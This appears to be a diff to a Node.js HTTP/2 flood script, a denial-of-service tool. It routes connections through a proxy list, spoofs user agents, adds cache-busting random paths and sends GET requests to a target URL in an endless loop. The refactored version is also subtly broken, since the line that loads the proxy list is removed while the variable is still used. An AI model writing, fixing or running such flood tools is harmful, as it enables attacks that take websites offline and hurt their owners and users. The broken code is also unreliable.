@@ -11,11 +11,8 @@ const http2 = require('http2');
 const fakeua = require('fake-useragent');
 tls.DEFAULT_ECDH_CURVE;
 
-let payload = {};
-
-var proxies = fs.readFileSync('utils/http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
-var objetive = process.argv[2];
-var parsed = url.parse(objetive);
+const objetive = process.argv[2];
+const parsed = url.parse(objetive);
 const sigalgs = [
     'ecdsa_secp256r1_sha256',
     'ecdsa_secp384r1_sha384',
@@ -27,7 +24,7 @@ const sigalgs = [
     'rsa_pkcs1_sha384',
     'rsa_pkcs1_sha512',
 ];
-let SignalsList = sigalgs.join(':');
+const SignalsList = sigalgs.join(':');
 
 class TlsBuilder {
     constructor(socket) {
@@ -35,21 +32,26 @@ class TlsBuilder {
         this.sigalgs = SignalsList;
         this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
     }
-    http2TUNNEL(socket) {
+    
+    async http2TUNNEL(socket) {
         const uas = fakeua();
         socket.setKeepAlive(true, 1000);
         socket.setTimeout(10000);
-        payload[":method"] = "GET";
-        payload["Referer"] = objetive;
-        payload["User-agent"] = uas,
-            payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload['client-control'] = 'max-age=43200, s-max-age=43200';
-        payload['Upgrade-Insecure-Requests'] = 1;
-        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
-        payload['Accept-Encoding'] = 'gzip, deflate, br';
-        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1';
-        payload[":path"] = parsed.path + "?" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        
+        let payload = {
+            ":method": "GET",
+            "Referer": objetive,
+            "User-agent": uas,
+            "Cache-Control": 'no-cache, no-store, private, max-age=0, must-revalidate',
+            "Pragma": 'no-cache, no-store, private, max-age=0, must-revalidate',
+            'client-control': 'max-age=43200, s-max-age=43200',
+            'Upgrade-Insecure-Requests': 1,
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
+            ":path": parsed.path + "?" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
+        };
+        
         const tunnel = http2.connect(parsed.href, {
             createConnection: () => tls.connect({
                 socket: socket,
@@ -64,78 +66,82 @@ class TlsBuilder {
                 rejectUnauthorized: false,
                 ALPNProtocols: ['h2'],
             }, () => {
-
-                for (let i = 0; i < 120; i++) {
-
-                    setInterval(async () => {
-                        await tunnel.request(payload).close()
-                    });
-                }
+                setInterval(async () => {
+                    await tunnel.request(payload).close();
+                });
             })
         });
     }
 }
 
-BuildTLS = new TlsBuilder();
-const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });
+const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
 
-function checkProxy(proxy) {
+async function checkProxy(proxy) {
     return new Promise((resolve, reject) => {
         proxy = proxy.split(':');
-        var req = http.get({
+        const req = http.get({
             host: proxy[0],
             port: proxy[1],
             timeout: 10000,
-            method: "CONNECT",
             agent: keepAliveAgent,
             path: parsed.host + ":443"
         });
+        
         req.end();
+        
         req.on('connect', (_, socket) => {
-            // If connected successfully, resolve with the proxy
             resolve(socket);
             req.close();
         });
+        
         req.on('error', (err) => {
-            // If error occurs during connection, reject with the error
             reject(err);
             req.close();
         });
     });
 }
 
-async function Runner() {
-    for (let i = 0; i < 100; i++) {
-        let proxy;
-        do {
-            proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        } while (!(await checkProxy(proxy)));
+async function runWithValidProxy() {
+    let validProxy = null;
+    
+    while (!validProxy) {
+        const proxy = proxies.shift(); // Take the first proxy from the list
+        if (!proxy) {
+            console.log('No more proxies available. Exiting.');
+            process.exit();
+        }
         
-        proxy = proxy.split(':');
-        var req = http.get({
-            host: proxy[0],
-            port: proxy[1],
-            timeout: 10000,
-            method: "CONNECT",
-            agent: keepAliveAgent,
-            path: parsed.host + ":443"
-        });
-        req.end();
-        req.on('connect', (_, socket) => {
-            BuildTLS.http2TUNNEL(socket);
-        });
-        req.on('end', () => {
-            req.resume()
-            req.close();
-        });
+        try {
+            validProxy = await checkProxy(proxy);
+        } catch (err) {
+            console.error(`Proxy ${proxy} is not working, trying another one...`);
+        }
     }
+    
+    const tlsBuilder = new TlsBuilder();
+    tlsBuilder.http2TUNNEL(validProxy);
 }
 
-setInterval(Runner);
+function scheduleProxyCheck() {
+    const interval = setInterval(async () => {
+        if (!proxies.length) {
+            console.log('No more proxies available. Exiting.');
+            clearInterval(interval);
+            process.exit();
+        }
+        
+        await runWithValidProxy();
+    }, 5000);
+}
 
-setTimeout(function () {
-    process.exit();
-}, process.argv[3] * 100000);
+scheduleProxyCheck();
 
-process.on('uncaughtException', function (er) {});
-process.on('unhandledRejection', function (er) {});
+process.on('uncaughtException', (err) => {
+    console.error('Uncaught Exception:', err);
+    process.exit(1);
+});
+
+process.on('unhandledRejection', (err) => {
+    console.error('Unhandled Rejection:', err);
+    process.exit(1);
+});
